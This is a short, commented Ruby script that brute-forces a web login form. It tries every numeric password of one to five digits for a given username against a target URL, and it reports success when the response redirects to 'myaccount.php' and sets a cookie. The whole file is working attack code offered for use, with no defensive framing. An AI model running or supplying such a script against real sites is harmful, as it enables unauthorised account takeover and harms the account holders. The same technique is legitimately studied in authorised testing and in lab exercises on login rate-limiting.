# Import the 'net/http' library
require 'net/http'

# Define constants for password generation
Input_space = '0'..'9'
Min_length = 1
Max_length = 5

# Extract target URL and username from command-line arguments
Target = ARGV[0]
User = ARGV[1]

# Define a recursive method to generate all possible combinations of passwords
def genst(st, pos, &block)
  return block.call(st) if pos <= 0
  Input_space.each { |x| genst(st + x, pos - 1, &block) }
end

# Define a method to generate passwords of different lengths
def genallpwd(&block)
  (Min_length..Max_length).each { |l| genst("", l, &block) }
end

# Parse the target URL
url = URI(Target)

# Initialize parameters with the provided username
params = { "user" => User }

# Create an HTTP connection to the target
http = Net::HTTP.start(url.host)

# Create an HTTP POST request for the target URL
req = Net::HTTP::Post.new(url.request_uri)

# Use password generation methods to find the correct password
real_pwd = genallpwd do |pwd|
  params["pass"] = pwd
  req.set_form_data(params)
  res = http.request(req)
  break pwd if (res['location'] == 'myaccount.php' && res['set-cookie'])
end

# Print the discovered password if it is a string
puts "\nPassword for '#{User}' is: " + real_pwd if real_pwd.is_a? String

# Close the HTTP connection
http.finish

